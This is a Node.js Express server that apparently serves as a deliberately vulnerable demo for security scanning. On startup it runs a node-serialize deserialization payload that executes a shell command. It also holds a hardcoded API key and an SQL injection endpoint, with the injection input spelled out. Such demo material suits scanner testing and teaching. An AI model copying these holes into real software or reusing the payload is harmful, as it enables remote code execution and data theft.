const express = require('express');
const serialize = require('node-serialize');

const evilPayload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'touch /tmp/pwned\', function(error, stdout, stderr){console.log(stdout)});}"}';
console.log("Demonstrating insecure deserialization. This is a critical vulnerability!");
serialize.unserialize(evilPayload);
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Snyk Code finding: Hardcoded secret
const HARDCODED_API_KEY = "sk_test_12345abcdefg_this_is_a_fake_key";
const RISK_SERVICE_URL = 'http://localhost:8000/calculate';

console.log(`Using hardcoded key starting with: ${HARDCODED_API_KEY.substring(0, 10)}...`);

app.post('/prioritize', async (req, res) => {
    const { title, description } = req.body;

    if (!title || !description) {
        return res.status(400).json({ error: 'Title and description are required.' });
    }

    try {
        const response = await axios.post(RISK_SERVICE_URL, {
            title,
            description,
        });
        res.json(response.data);
    } catch (error) {
        console.error("Error calling risk-service:", error.message);
        res.status(500).json({ error: 'Failed to calculate risk score.' });
    }
});
// --- START: SQL INJECTION VULNERABILITY ---

const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database(':memory:'); // Use an in-memory database for the demo

// Setup a dummy table and data
db.serialize(() => {
    db.run("CREATE TABLE tasks (id INT, title TEXT, description TEXT)");
    db.run(`INSERT INTO tasks VALUES (1, 'Buy milk', 'Get the good kind')`);
    db.run(`INSERT INTO tasks VALUES (2, 'Call mom', 'Remember her birthday is soon')`);
});

// VULNERABLE ENDPOINT
// This code uses string concatenation to build a SQL query, which allows for SQL Injection.
// An attacker can provide a malicious ID like "2 OR 1=1" to bypass logic and dump data.
app.get('/tasks/:id', (req, res) => {
    const taskId = req.params.id;
    console.log(`Searching for task with ID: ${taskId}`);

    // Snyk Code will flag this line as a SQL Injection vulnerability
    const query = `SELECT * FROM tasks WHERE id = ${taskId}`;

    db.get(query, (err, row) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json({ task: row || 'No task found.' });
    });
});

// --- END: SQL INJECTION VULNERABILITY ---
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`API server running on port ${PORT}`);
});